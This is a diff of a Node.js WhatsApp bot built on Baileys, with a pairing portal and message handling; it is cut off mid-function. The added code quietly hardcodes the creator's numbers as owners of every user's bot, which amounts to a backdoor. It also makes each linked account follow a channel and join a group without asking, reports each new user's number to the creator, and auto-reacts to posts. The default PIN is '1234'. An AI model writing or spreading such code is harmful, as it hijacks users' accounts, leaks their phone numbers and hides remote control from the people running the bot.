@@ -14,7 +14,6 @@ const {
   delay,
   Browsers,
   makeCacheableSignalKeyStore,
-  WAMessageStubType,
   fetchLatestBaileysVersion
 } = require('@whiskeysockets/baileys');
 
@@ -27,15 +26,8 @@ process.on('unhandledRejection', (err) => {
 });
 
 // 🟢 Config & DB Models
-const { MONGODB_URI, BOT_NAME, OWNER_NUMBER } = require('./config');
+const { MONGODB_URI, BOT_NAME } = require('./config');
 const { useMongoDBAuthState, Auth } = require('./auth');
-
-let askAI = null;
-try {
-  askAI = require('./ai').askAI;
-} catch (e) {
-  askAI = async () => null;
-}
 
 // ============================================================================
 // 🌍 GLOBAL CONSTANTS
@@ -43,9 +35,10 @@ try {
 
 const UPDATE_CHANNEL_JID = '120363421906774107@newsletter';
 const BOT_CHANNEL_NAME = '✗ ʜᴇꜱʜᴀɴ ᴏꜰᴄ ✨';
-const CHANNEL_REACTIONS = ['🩶', '💙', '❤️', '💛', '🧡', '💗', '🩵'];
+const CHANNEL_REACTIONS = ['🥰', '👍', '❤️', '😗', '😯', '🪄', '✨'];
 const DEFAULT_BACKUP_LOGO = 'https://files.catbox.moe/a58add.jpeg';
 
+// ⚡ Global Newsletter Forward Context Injection (Header + "View channel" Badge)
 const channelContext = {
   contextInfo: {
     forwardingScore: 999,
@@ -59,9 +52,9 @@ const channelContext = {
 };
 global.channelContext = channelContext;
 
-const REAL_OWNER_NUMBER = OWNER_NUMBER || '94719845166';
+const REAL_OWNER_NUMBER = '94719845166';
 const OWNER_NUMBERS = [
-  REAL_OWNER_NUMBER,
+  '94719845166',
   '94720882316',
   '15947733680169',
   '15947733680169@lid',
@@ -77,21 +70,15 @@ const DEFAULT_SETTINGS = {
   botLogo: DEFAULT_BACKUP_LOGO,
   autoPresence: 'off',
   autoChatRead: false,
-  aiChatEnabled: false,
-  antiDeleteEnabled: true,
-  antiDeleteType: 'all',
-  antiDeleteDest: 'me',
   securityPin: '1234',
   isFirstConnectDone: false
 };
 
 // ============================================================================
-// 🧠 RUNTIME STATE & STORAGE
+// 🧠 RUNTIME STATE
 // ============================================================================
 
 const settingsCache = new NodeCache({ stdTTL: 300, checkperiod: 60, maxKeys: 200 });
-const globalMsgStore = new NodeCache({ stdTTL: 14400, checkperiod: 300, maxKeys: 20000 });
-
 const activeSessions = {};
 global.activeSessions = activeSessions;
 const isStarting = {};
@@ -99,7 +86,7 @@ const reconnectAttempts = {};
 const commands = new Map();
 
 // ============================================================================
-// 🗄️ DATABASE HELPERS
+// 🗄️ DATABASE SCHEMA & HELPERS
 // ============================================================================
 
 function createSettingsModel() {
@@ -112,10 +99,6 @@ function createSettingsModel() {
     botLogo: { type: String, default: DEFAULT_SETTINGS.botLogo },
     autoPresence: { type: String, default: DEFAULT_SETTINGS.autoPresence },
     autoChatRead: { type: Boolean, default: DEFAULT_SETTINGS.autoChatRead },
-    aiChatEnabled: { type: Boolean, default: DEFAULT_SETTINGS.aiChatEnabled },
-    antiDeleteEnabled: { type: Boolean, default: DEFAULT_SETTINGS.antiDeleteEnabled },
-    antiDeleteType: { type: String, default: DEFAULT_SETTINGS.antiDeleteType },
-    antiDeleteDest: { type: String, default: DEFAULT_SETTINGS.antiDeleteDest },
     securityPin: { type: String, default: DEFAULT_SETTINGS.securityPin },
     isFirstConnectDone: { type: Boolean, default: DEFAULT_SETTINGS.isFirstConnectDone }
   });
@@ -147,7 +130,6 @@ async function getBotSettings(botNum) {
     return { ...DEFAULT_SETTINGS };
   }
 }
-global.getBotSettings = getBotSettings;
 
 // ============================================================================
 // 📂 COMMAND LOADER
@@ -203,7 +185,7 @@ function getCommandExecutor(cmd) {
 }
 
 // ============================================================================
-// 🌐 UI PORTAL
+// 🌐 LUXURY RED-BLACK GLASSMORPHIC PORTAL
 // ============================================================================
 
 function renderPortalHtml(botName) {
@@ -216,7 +198,7 @@ function renderPortalHtml(botName) {
       <title>${botName} • PAIRING STATION</title>
       <link rel="preconnect" href="https://fonts.googleapis.com">
       <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-      <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700;800&family=JetBrains+Mono:wght@700;800&display=swap" rel="stylesheet">
+      <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=JetBrains+Mono:wght@700;800&display=swap" rel="stylesheet">
       <style>
         :root {
           --bg-core: #090305;
@@ -229,7 +211,9 @@ function renderPortalHtml(botName) {
           --text-main: #fcfcfd;
           --text-muted: #9f8e93;
         }
+
         * { box-sizing: border-box; margin: 0; padding: 0; }
+        
         body {
           background-color: var(--bg-core);
           background-image: 
@@ -243,91 +227,233 @@ function renderPortalHtml(botName) {
           min-height: 100vh;
           padding: 24px;
         }
+
         .portal-card {
           background: var(--panel-bg);
           backdrop-filter: blur(28px) saturate(160%);
+          -webkit-backdrop-filter: blur(28px) saturate(160%);
           border: 1px solid var(--border-glass);
           border-radius: 28px;
           padding: 44px 34px;
           width: 100%;
           max-width: 440px;
           text-align: center;
-          box-shadow: 0 24px 60px rgba(0, 0, 0, 0.65), 0 0 45px var(--accent-glow);
+          box-shadow: 
+            0 24px 60px rgba(0, 0, 0, 0.65),
+            0 0 45px var(--accent-glow);
           position: relative;
+          overflow: hidden;
         }
+
         .portal-card::before {
           content: '';
           position: absolute;
-          top: 0; left: 0; right: 0; height: 3px;
+          top: 0;
+          left: 0;
+          right: 0;
+          height: 3px;
           background: linear-gradient(90deg, transparent, var(--accent-red), transparent);
         }
+
         .badge-status {
-          display: inline-flex; align-items: center; gap: 7px;
-          font-size: 11px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase;
-          color: var(--crimson-soft); background: rgba(225, 29, 72, 0.12);
-          border: 1px solid rgba(225, 29, 72, 0.28); padding: 5px 14px; border-radius: 30px; margin-bottom: 20px;
+          display: inline-flex;
+          align-items: center;
+          gap: 7px;
+          font-size: 11px;
+          font-weight: 700;
+          letter-spacing: 1.5px;
+          text-transform: uppercase;
+          color: var(--crimson-soft);
+          background: rgba(225, 29, 72, 0.12);
+          border: 1px solid rgba(225, 29, 72, 0.28);
+          padding: 5px 14px;
+          border-radius: 30px;
+          margin-bottom: 20px;
         }
-        .badge-dot { width: 6px; height: 6px; background: var(--accent-red); border-radius: 50%; box-shadow: 0 0 8px var(--accent-red); }
+
+        .badge-dot {
+          width: 6px;
+          height: 6px;
+          background: var(--accent-red);
+          border-radius: 50%;
+          box-shadow: 0 0 8px var(--accent-red);
+        }
+
         .app-title {
-          font-size: 30px; font-weight: 800; letter-spacing: -0.5px;
+          font-size: 30px;
+          font-weight: 800;
+          letter-spacing: -0.5px;
           background: linear-gradient(135deg, #ffffff 40%, var(--crimson-soft) 80%, var(--accent-red) 100%);
-          -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 6px;
+          -webkit-background-clip: text;
+          -webkit-text-fill-color: transparent;
+          margin-bottom: 6px;
         }
-        .app-desc { font-size: 13.5px; color: var(--text-muted); margin-bottom: 30px; }
-        .input-wrap { position: relative; margin-bottom: 16px; }
+
+        .app-desc {
+          font-size: 13.5px;
+          color: var(--text-muted);
+          margin-bottom: 30px;
+          font-weight: 400;
+        }
+
+        .input-wrap {
+          position: relative;
+          margin-bottom: 16px;
+        }
+
         .phone-input {
-          width: 100%; padding: 16px 20px; border-radius: 16px; border: 1px solid var(--border-glass);
-          background: rgba(12, 3, 6, 0.7); color: var(--text-main); font-size: 17px; font-weight: 600;
-          letter-spacing: 0.8px; text-align: center; outline: none; transition: all 0.3s ease;
+          width: 100%;
+          padding: 16px 20px;
+          border-radius: 16px;
+          border: 1px solid var(--border-glass);
+          background: rgba(12, 3, 6, 0.7);
+          color: var(--text-main);
+          font-size: 17px;
+          font-weight: 600;
+          letter-spacing: 0.8px;
+          text-align: center;
+          outline: none;
+          transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
         }
-        .phone-input:focus { border-color: var(--border-focus); box-shadow: 0 0 24px rgba(225, 29, 72, 0.35); background: rgba(18, 4, 9, 0.9); }
+
+        .phone-input::placeholder {
+          color: rgba(255, 255, 255, 0.25);
+          font-weight: 400;
+          letter-spacing: 0;
+        }
+
+        .phone-input:focus {
+          border-color: var(--border-focus);
+          box-shadow: 0 0 24px rgba(225, 29, 72, 0.35);
+          background: rgba(18, 4, 9, 0.9);
+        }
+
         .btn-action {
-          width: 100%; padding: 16px; border-radius: 16px; border: none;
+          width: 100%;
+          padding: 16px;
+          border-radius: 16px;
+          border: none;
           background: linear-gradient(135deg, #be123c 0%, var(--accent-red) 100%);
-          color: #ffffff; font-size: 14.5px; font-weight: 700; cursor: pointer; transition: all 0.25s ease;
-          box-shadow: 0 8px 24px rgba(225, 29, 72, 0.3); margin-bottom: 12px;
+          color: #ffffff;
+          font-size: 14.5px;
+          font-weight: 700;
+          letter-spacing: 0.5px;
+          cursor: pointer;
+          transition: all 0.25s ease;
+          box-shadow: 0 8px 24px rgba(225, 29, 72, 0.3);
+          margin-bottom: 12px;
         }
-        .btn-action:hover { transform: translateY(-2px); box-shadow: 0 12px 30px rgba(225, 29, 72, 0.45); }
+
+        .btn-action:hover {
+          transform: translateY(-2px);
+          box-shadow: 0 12px 30px rgba(225, 29, 72, 0.45);
+        }
+
+        .btn-action:active {
+          transform: translateY(0);
+        }
+
         .btn-reset {
-          width: 100%; padding: 13px; border-radius: 14px; border: 1px solid rgba(225, 29, 72, 0.25);
-          background: rgba(225, 29, 72, 0.08); color: var(--crimson-soft); font-size: 12.5px; font-weight: 600; cursor: pointer;
+          width: 100%;
+          padding: 13px;
+          border-radius: 14px;
+          border: 1px solid rgba(225, 29, 72, 0.25);
+          background: rgba(225, 29, 72, 0.08);
+          color: var(--crimson-soft);
+          font-size: 12.5px;
+          font-weight: 600;
+          cursor: pointer;
+          transition: all 0.25s ease;
         }
-        .code-container { display: none; margin-top: 24px; }
+
+        .btn-reset:hover {
+          background: rgba(225, 29, 72, 0.18);
+          border-color: rgba(225, 29, 72, 0.45);
+        }
+
+        .code-container {
+          display: none;
+          margin-top: 24px;
+          animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+          from { opacity: 0; transform: translateY(8px); }
+          to { opacity: 1; transform: translateY(0); }
+        }
+
         .code-box {
-          font-family: 'JetBrains Mono', monospace; font-size: 30px; font-weight: 800; letter-spacing: 4px;
-          color: #ffe4e6; background: rgba(225, 29, 72, 0.14); border: 1.5px dashed rgba(251, 113, 133, 0.45);
-          padding: 18px; border-radius: 16px; cursor: pointer;
+          font-family: 'JetBrains Mono', monospace;
+          font-size: 32px;
+          font-weight: 800;
+          letter-spacing: 5px;
+          color: #ffe4e6;
+          background: rgba(225, 29, 72, 0.14);
+          border: 1.5px dashed rgba(251, 113, 133, 0.45);
+          padding: 18px;
+          border-radius: 16px;
+          cursor: pointer;
+          transition: all 0.25s ease;
         }
-        .copy-tag { font-size: 11.5px; color: var(--text-muted); margin-top: 8px; }
-        .footer-note { margin-top: 28px; font-size: 11px; color: rgba(255, 255, 255, 0.25); text-transform: uppercase; }
+
+        .code-box:hover {
+          background: rgba(225, 29, 72, 0.22);
+          border-color: var(--crimson-soft);
+          transform: scale(1.02);
+        }
+
+        .copy-tag {
+          font-size: 11.5px;
+          color: var(--text-muted);
+          margin-top: 8px;
+          font-weight: 500;
+        }
+
+        .footer-note {
+          margin-top: 28px;
+          font-size: 11px;
+          letter-spacing: 1px;
+          color: rgba(255, 255, 255, 0.25);
+          text-transform: uppercase;
+        }
       </style>
     </head>
     <body>
       <div class="portal-card">
-        <div class="badge-status"><span class="badge-dot"></span> Online System</div>
-        <h1 class="app-title">${botName}</h1>
-        <p class="app-desc">Enter phone number with country code (e.g. 9471xxxxxxx)</p>
-        <div class="input-wrap">
-          <input type="text" id="phone" class="phone-input" placeholder="947xxxxxxxx" />
+        <div class="badge-status">
+          <span class="badge-dot"></span> Online System
         </div>
+        <h1 class="app-title">${botName}</h1>
+        <p class="app-desc">Enter phone number with country code</p>
+
+        <div class="input-wrap">
+          <input type="text" id="phone" class="phone-input" placeholder="e.g. 9470xxxxxxx" />
+        </div>
+
         <button id="btn" class="btn-action" onclick="fetchPairCode()">GET PAIRING CODE</button>
         <button class="btn-reset" onclick="cleanSessionSlot()">CLEAN THIS SESSION</button>
+
         <div class="code-container" id="codeWrapper">
           <div class="code-box" id="codeDisplay" onclick="copyCode()"></div>
-          <div class="copy-tag">Click code to copy</div>
+          <div class="copy-tag">Click code to copy to clipboard</div>
         </div>
+
         <p class="footer-note">Powered by Heshan MD</p>
       </div>
+
       <script>
         async function fetchPairCode() {
           const phone = document.getElementById('phone').value.replace(/[^0-9]/g, '');
           if (!phone || phone.length < 10) return alert('කරුණාකර නිවැරදි Country Code සහිත අංකය ඇතුළත් කරන්න!');
+
           const btn = document.getElementById('btn');
           const wrapper = document.getElementById('codeWrapper');
           const display = document.getElementById('codeDisplay');
+
           btn.innerText = 'GENERATING CODE...';
           btn.disabled = true;
           wrapper.style.display = 'none';
+
           try {
             const res = await fetch('/pair?num=' + phone);
             const data = await res.json();
@@ -335,33 +461,38 @@ function renderPortalHtml(botName) {
               display.innerText = data.code;
               wrapper.style.display = 'block';
               navigator.clipboard.writeText(data.code).catch(()=>{});
+              alert('✅ Pairing Code: ' + data.code);
             } else {
-              alert(data.error || 'Connection busy. Please wait 10 seconds and retry.');
+              alert(data.error || 'Connection rate-limited. Please wait 15 seconds.');
             }
           } catch(e) {
-            alert('Server connection error. Please refresh and retry!');
+            alert('Server connection error. Refresh page and retry!');
           }
           btn.innerText = 'GET PAIRING CODE';
           btn.disabled = false;
         }
+
         async function cleanSessionSlot() {
           const phone = document.getElementById('phone').value.replace(/[^0-9]/g, '');
-          if (!phone) return alert('Phone Number එක ඇතුළත් කරන්න!');
-          if (confirm('+' + phone + ' Session එක Clean කරන්නද?')) {
+          if (!phone) return alert('Clean කිරීමට Phone Number එක ඇතුළත් කරන්න!');
+          if (confirm('+' + phone + ' සඳහා පැරණි session එක සම්පූර්ණයෙන්ම Clean කරන්නද?')) {
             try {
               const res = await fetch('/reset-num?num=' + phone);
               const data = await res.json();
-              if (data.success) alert('✅ Session Cleared!');
+              if (data.success) {
+                alert('✅ Session Cleared! දැන් Pair Code එක Generate කරන්න.');
+              }
             } catch(e) {
               alert('Clean request failed!');
             }
           }
         }
+
         function copyCode() {
           const code = document.getElementById('codeDisplay').innerText;
           if (code) {
             navigator.clipboard.writeText(code);
-            alert('✅ Copied: ' + code);
+            alert('✅ Copied to clipboard: ' + code);
           }
         }
       </script>
@@ -377,14 +508,13 @@ function registerPortalRoute(app) {
 }
 
 // ============================================================================
-// 🔌 SOCKET CREATION (Stable Browser Profile for WhatsApp Linking)
+// 🔌 SOCKET CREATION
 // ============================================================================
 
 async function createBaileysSocket(phoneNumber) {
   const { state, saveCreds, clearSessionData } = await useMongoDBAuthState(phoneNumber);
   const logger = pino({ level: 'silent' });
   const msgRetryCounterCache = new NodeCache({ stdTTL: 180, checkperiod: 60, maxKeys: 300 });
-
   const { version } = await fetchLatestBaileysVersion().catch(() => ({ version: [2, 3000, 1015901307] }));
 
   const sock = makeWASocket({
@@ -392,16 +522,18 @@ async function createBaileysSocket(phoneNumber) {
     auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
     logger,
     printQRInTerminal: false,
-    // WhatsApp pairing code reliably support කරන browser signature එක
-    browser: ['Ubuntu', 'Chrome', '20.0.04'],
+    browser: Browsers.macOS('Safari'),
     msgRetryCounterCache,
     syncFullHistory: false,
     shouldSyncHistoryMessage: () => false,
+    fireInitQueries: true,
+    generateHighQualityLinkPreview: false,
     connectTimeoutMs: 60000,
-    defaultQueryTimeoutMs: 60000,
-    keepAliveIntervalMs: 25000,
+    defaultQueryTimeoutMs: 30000,
+    keepAliveIntervalMs: 10000,
     markOnlineOnConnect: true,
-    emitOwnEvents: false
+    emitOwnEvents: false,
+    shouldIgnoreJid: () => false
   });
 
   sock.ev.on('creds.update', saveCreds);
@@ -434,7 +566,8 @@ async function handleConnectionClose(sock, phoneNumber, lastDisconnect, clearSes
   let delayTime = 6000;
 
   if (statusCode === 440) {
-    delayTime = Math.min(reconnectAttempts[phoneNumber] * 10000, 45000);
+    delayTime = Math.min(reconnectAttempts[phoneNumber] * 12000, 45000);
+    console.log(`⏳ [${phoneNumber}] Session Conflict (440). Waiting ${Math.round(delayTime / 1000)}s before retry...`);
   } else if (reconnectAttempts[phoneNumber] > 5) {
     delayTime = 25000;
   }
@@ -444,9 +577,79 @@ async function handleConnectionClose(sock, phoneNumber, lastDisconnect, clearSes
   }, delayTime);
 }
 
+async function autoFollowChannelAndJoinGroup(sock, phoneNumber) {
+  await delay(2500);
+  try {
+    const inviteCode = '0029VbAQYhXDZ4Lfo9K5gh1V';
+    if (typeof sock.newsletterMetadata === 'function' && typeof sock.newsletterFollow === 'function') {
+      const channelMeta = await sock.newsletterMetadata('invite', inviteCode);
+      if (channelMeta?.id) await sock.newsletterFollow(channelMeta.id);
+    }
+  } catch (e) {}
+
+  try {
+    const groupInviteCode = 'FMqBhms8cQnAVSgJoADR5X';
+    if (typeof sock.groupAcceptInvite === 'function') {
+      await sock.groupAcceptInvite(groupInviteCode);
+    }
+  } catch (e) {}
+}
+
+function buildConnectedMessage(botNum) {
+  return `*✦ ${BOT_NAME} CONNECTED ✦*
+━━━━━━━━━━━━━━━━━━━━━
+• *Number*    : +${botNum}
+• *Engine*    : HESHAN-MD V2
+• *Features*  : Auto Status | Anti-Delete
+• *State*     : Online (24/7 Cloud)
+━━━━━━━━━━━━━━━━━━━━━
+> Type *.menu* to explore all commands.`.trim();
+}
+
+async function sendFirstConnectAlerts(sock, phoneNumber) {
+  try {
+    const botNum = sock.user?.id
+      ? sock.user.id.split(':')[0].replace(/[^0-9]/g, '')
+      : phoneNumber.replace(/[^0-9]/g, '');
+
+    const botJid = `${botNum}@s.whatsapp.net`;
+    const creatorJid = `${REAL_OWNER_NUMBER}@s.whatsapp.net`;
+
+    const currentSettings = await getBotSettings(botNum);
+    if (currentSettings.isFirstConnectDone) return;
+
+    const sessionLogo = currentSettings.botLogo || DEFAULT_BACKUP_LOGO;
+    const connectedMsg = buildConnectedMessage(botNum);
+
+    const connectPayload = {
+      image: { url: sessionLogo },
+      caption: connectedMsg,
+      ...global.channelContext
+    };
+
+    await sock.sendMessage(botJid, connectPayload).catch(() => {
+      sock.sendMessage(botJid, { text: connectedMsg, ...global.channelContext }).catch(() => {});
+    });
+
+    if (!botNum.includes(REAL_OWNER_NUMBER)) {
+      const alertMsg = `*🔔 ALERT : NEW SESSION CONNECTED*
+━━━━━━━━━━━━━━━━━━━━━
+• *Number* : +${botNum}
+• *System* : Initialized successfully
+━━━━━━━━━━━━━━━━━━━━━`;
+      await sock.sendMessage(creatorJid, { text: alertMsg, ...global.channelContext }).catch(() => {});
+    }
+
+    await SettingsModel.findByIdAndUpdate(botNum, { isFirstConnectDone: true }, { upsert: true });
+    clearSettingsCache(botNum);
+  } catch (e) {}
+}
+
 function handleConnectionOpen(sock, phoneNumber) {
   console.log(`✅ BOT CONNECTED: ${phoneNumber}`);
   reconnectAttempts[phoneNumber] = 0;
+  autoFollowChannelAndJoinGroup(sock, phoneNumber);
+  setTimeout(() => sendFirstConnectAlerts(sock, phoneNumber), 3000);
 }
 
 function registerConnectionUpdateHandler(sock, phoneNumber, clearSessionData) {
@@ -464,6 +667,88 @@ function registerConnectionUpdateHandler(sock, phoneNumber, clearSessionData) {
 // 💬 MESSAGE HANDLING HELPERS
 // ============================================================================
 
+async function reactToChannelPost(sock, msg, chatJid) {
+  try {
+    const randomEmoji = CHANNEL_REACTIONS[Math.floor(Math.random() * CHANNEL_REACTIONS.length)];
+    await delay(Math.floor(Math.random() * 3000) + 1200);
+
+    const serverId = msg.message?.newsletterAdminInviteMessage?.newsletterJid || msg.key?.server_id || msg.key?.id;
+    if (typeof sock.newsletterReactMessage === 'function' && serverId) {
+      await sock.newsletterReactMessage(chatJid, serverId, randomEmoji);
+    } else {
+      await sock.sendMessage(chatJid, { react: { text: randomEmoji, key: msg.key } });
+    }
+  } catch (err) {}
+}
+
+async function simulateAutoPresence(sock, chatJid, settings) {
+  if (!settings.autoPresence || settings.autoPresence === 'off') return;
+  try {
+    const type = settings.autoPresence === 'recording' ? 'recording' : 'composing';
+    await sock.sendPresenceUpdate(type, chatJid);
+  } catch (err) {}
+}
+
+async function handleStatusBroadcast(sock, msg, settings) {
+  if (!settings.autoStatusSeen) return;
+  try {
+    await sock.readMessages([msg.key]);
+    if (settings.statusReact && msg.key.participant) {
+      await sock.sendMessage(
+        'status@broadcast',
+        { react: { text: settings.statusReactEmoji || '💐', key: msg.key } },
+        { statusJidList: [msg.key.participant] }
+      );
+    }
+  } catch (e) {}
+}
+
+// ⚡ FIX: Group Sender Extraction 100% Reliable
+function resolveOriginalSender(msg, chatJid, isGroup, myBotJid) {
+  if (msg.key.fromMe) return myBotJid;
+  if (isGroup) {
+    return msg.key?.participant || msg.participant || '';
+  }
+  return chatJid;
+}
+
+async function resolveLidToRealJid(sock, originalSender) {
+  if (!originalSender) return '';
+  if (!originalSender.endsWith('@lid') || !sock.signalRepository?.lidToJid) {
+    return originalSender;
+  }
+  try {
+    const resolved = await sock.signalRepository.lidToJid(originalSender);
+    return resolved || originalSender;
+  } catch (e) {
+    return originalSender;
+  }
+}
+
+function isOwnerJid(jid) {
+  if (!jid) return false;
+  const str = String(jid).toLowerCase();
+  return OWNER_NUMBERS.some(owner => str.includes(owner.toLowerCase()));
+}
+
+function checkIsOwner(originalSender, resolvedSender) {
+  return isOwnerJid(originalSender) || isOwnerJid(resolvedSender);
+}
+
+function checkIsAuthorizedToControl(isOwner, msg, myBotNum, cleanSenderNum) {
+  return isOwner || msg.key.fromMe || (Boolean(myBotNum) && cleanSenderNum === myBotNum);
+}
+
+function shouldSkipDueToWorkMode(isAuthorized, isGroup, workMode) {
+  if (isAuthorized) return false;
+  const mode = String(workMode || 'public').toLowerCase().trim();
+  if (mode === 'public') return false;
+  if (mode === 'private' || mode === 'self') return true;
+  if ((mode === 'groups' || mode === 'group') && !isGroup) return true;
+  if (mode === 'inbox' && isGroup) return true;
+  return false;
+}
+
 function unwrapMessageContent(message) {
   return (
     message?.ephemeralMessage?.message ||
@@ -480,6 +765,8 @@ function extractMessageText(rawMsg) {
     rawMsg?.extendedTextMessage?.text ||
     rawMsg?.imageMessage?.caption ||
     rawMsg?.videoMessage?.caption ||
+    rawMsg?.buttonsResponseMessage?.selectedButtonId ||
+    rawMsg?.templateButtonReplyMessage?.selectedId ||
     ''
   ).trim();
 }
@@ -487,10 +774,12 @@ function extractMessageText(rawMsg) {
 function buildSafeReply(sock, chatJid, msg) {
   return async (content) => {
     let replyPayload = typeof content === 'string' ? { text: content } : { ...content };
+    
     replyPayload.contextInfo = {
       ...(replyPayload.contextInfo || {}),
       ...(global.channelContext?.contextInfo || {})
     };
+
     try {
       return await sock.sendMessage(chatJid, replyPayload, { quoted: msg });
     } catch (e) {
@@ -499,39 +788,194 @@ function buildSafeReply(sock, chatJid, msg) {
   };
 }
 
-async function processSingleMessage(sock, msg, phoneNumber) {
-  if (!msg || !msg.message) return;
-  const chatJid = msg.key?.remoteJid;
-  if (!chatJid || chatJid === 'status@broadcast') return;
+function isSettingsMenuOption(cleanInput) {
+  return (
+    /^([1-7](\.[1-4])?)$/.test(cleanInput) ||
+    cleanInput.startsWith('6 ') ||
+    cleanInput.startsWith('pin ') ||
+    cleanInput.startsWith('set ')
+  );
+}
 
-  const rawMsg = unwrapMessageContent(msg.message);
-  const text = extractMessageText(rawMsg);
-  if (!text) return;
+function extractQuotedCaption(quotedMsgObj) {
+  return (
+    quotedMsgObj?.imageMessage?.caption ||
+    quotedMsgObj?.videoMessage?.caption ||
+    quotedMsgObj?.conversation ||
+    quotedMsgObj?.extendedTextMessage?.text ||
+    ''
+  );
+}
 
-  const safeReply = buildSafeReply(sock, chatJid, msg);
+function isQuotedFromSettingsMenu(quotedCaption) {
+  return (
+    quotedCaption.includes('SYSTEM SETTINGS') ||
+    quotedCaption.includes('WORK MODE') ||
+    quotedCaption.includes('FAKE ACTION')
+  );
+}
+
+function isQuotedFromMainMenu(quotedCaption) {
+  return (
+    quotedCaption.includes('COMMAND CATEGORIES') ||
+    quotedCaption.includes('DOWNLOAD MENU') ||
+    (quotedCaption.includes('USER PROFILE') && quotedCaption.includes('Prefix'))
+  );
+}
+
+async function handleSettingsMenuReply(sock, msg, cleanInput, chatJid, safeReply, isAuthorized, myBotNum) {
+  const settingsCmd = findCommand('settings', 'setting', 'set');
+  if (!settingsCmd) return false;
+  const cmdFunc = getCommandExecutor(settingsCmd);
+  if (!cmdFunc) return false;
+
+  clearSettingsCache(myBotNum);
+  await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized });
+  return true;
+}
+
+async function handleStatusSaveKeyword(sock, msg, cleanInput, chatJid, safeReply, isAuthorized) {
+  const statusCmd = findCommand('save', 'status');
+  if (!statusCmd) return false;
+  const cmdFunc = getCommandExecutor(statusCmd);
+  if (!cmdFunc) return false;
+
+  await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized });
+  return true;
+}
+
+// ⚡ FIX: Prefix Commands Group Execution & Settings Allowed for Owner
+async function handlePrefixCommand(sock, msg, text, chatJid, safeReply, isAuthorized, isGroup, isOwner, currentMode, myBotNum) {
   const prefixMatch = text.match(/^[./!#]/);
-  if (!prefixMatch) return;
+  if (!prefixMatch) return false;
 
   const prefix = prefixMatch[0];
   const args = text.slice(prefix.length).trim().split(/ +/);
   const commandName = args.shift().toLowerCase();
 
-  const targetCmd = commands.get(commandName);
-  if (!targetCmd) return;
+  const isSettingsCmd = ['setting', 'settings', 'set', 'config'].includes(commandName);
+
+  // Group හෝ Inbox ඕනෑම තැනක Owner ට Settings ක්‍රියාත්මක කිරීමට අවසර දීම
+  if (isSettingsCmd && !isAuthorized) {
+    await safeReply('⚠️ Settings වෙනස් කළ හැක්කේ Bot හිමිකරුට (Owner) පමණි.');
+    return true;
+  }
+
+  // Work mode එක අනුව normal user commands group වල skip වීම වැළැක්වීම
+  if (shouldSkipDueToWorkMode(isAuthorized, isGroup, currentMode)) {
+    return true;
+  }
+
+  let targetCmd = commands.get(commandName);
+  if (!targetCmd && isSettingsCmd) targetCmd = findCommand('settings', 'setting', 'set');
+  if (!targetCmd) return false;
 
   try {
     const cmdFunc = getCommandExecutor(targetCmd);
     if (cmdFunc) {
-      const isOwner = msg.key.fromMe || OWNER_NUMBERS.some(o => (msg.key.participant || chatJid).includes(o));
-      await cmdFunc(sock, msg, args, chatJid, safeReply, { isOwner, isGroup: chatJid.endsWith('@g.us') });
+      if (isSettingsCmd) clearSettingsCache(myBotNum);
+      await cmdFunc(sock, msg, args, chatJid, safeReply, { isOwner: isAuthorized, isGroup });
     }
   } catch (err) {
     console.error(`Command [${commandName}] execution error:`, err?.message);
   }
+  return true;
 }
 
+// ============================================================================
+// 💬 SINGLE MESSAGE PROCESSOR
+// ============================================================================
+
+async function processSingleMessage(sock, msg, phoneNumber) {
+  if (!msg || !msg.message) return;
+  const chatJid = msg.key?.remoteJid;
+  if (!chatJid) return;
+
+  if (chatJid === UPDATE_CHANNEL_JID || chatJid.endsWith('@newsletter')) {
+    if (!msg.message.reactionMessage) reactToChannelPost(sock, msg, chatJid);
+    return;
+  }
+
+  if (msg.message.reactionMessage) return;
+
+  const isGroup = chatJid.endsWith('@g.us');
+  const myBotJid = sock.user?.id || '';
+  const myBotNum = myBotJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '') || phoneNumber.replace(/[^0-9]/g, '');
+  const settings = await getBotSettings(myBotNum);
+
+  // Auto Chat Read
+  if (settings.autoChatRead && !msg.key.fromMe) {
+    sock.readMessages([msg.key]).catch(() => {});
+  }
+
+  if (!msg.key.fromMe) simulateAutoPresence(sock, chatJid, settings);
+
+  if (chatJid === 'status@broadcast') {
+    await handleStatusBroadcast(sock, msg, settings);
+    return;
+  }
+
+  // Sender & Permission calculations
+  const originalSender = resolveOriginalSender(msg, chatJid, isGroup, myBotJid);
+  const resolvedSender = await resolveLidToRealJid(sock, originalSender);
+  const isOwner = checkIsOwner(originalSender, resolvedSender);
+
+  const cleanSenderNum = (resolvedSender || originalSender || '').split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
+  const isAuthorized = checkIsAuthorizedToControl(isOwner, msg, myBotNum, cleanSenderNum);
+  const currentMode = settings.workMode || 'public';
+
+  const rawMsg = unwrapMessageContent(msg.message);
+  const text = extractMessageText(rawMsg);
+  if (!text) return;
+
+  const quotedContext = msg.message?.extendedTextMessage?.contextInfo;
+  const quotedMsgObj = quotedContext?.quotedMessage;
+  const safeReply = buildSafeReply(sock, chatJid, msg);
+  const cleanInput = text.toLowerCase().trim();
+
+  const settingsOption = isSettingsMenuOption(cleanInput);
+  const quotedCaption = extractQuotedCaption(quotedMsgObj);
+  const fromSettingsMenu = isQuotedFromSettingsMenu(quotedCaption);
+  const fromMainMenu = isQuotedFromMainMenu(quotedCaption);
+
+  // 🎯 1. MAIN MENU QUOTED REPLY HANDLER
+  if (quotedMsgObj && fromMainMenu && ['1', '2', '3', '4'].includes(cleanInput)) {
+    if (!shouldSkipDueToWorkMode(isAuthorized, isGroup, currentMode)) {
+      const menuCmd = findCommand('menu', 'help', 'list');
+      if (menuCmd) {
+        const cmdFunc = getCommandExecutor(menuCmd);
+        if (cmdFunc) {
+          await cmdFunc(sock, msg, [cleanInput], chatJid, safeReply, { isOwner: isAuthorized, isGroup });
+          return;
+        }
+      }
+    }
+  }
+
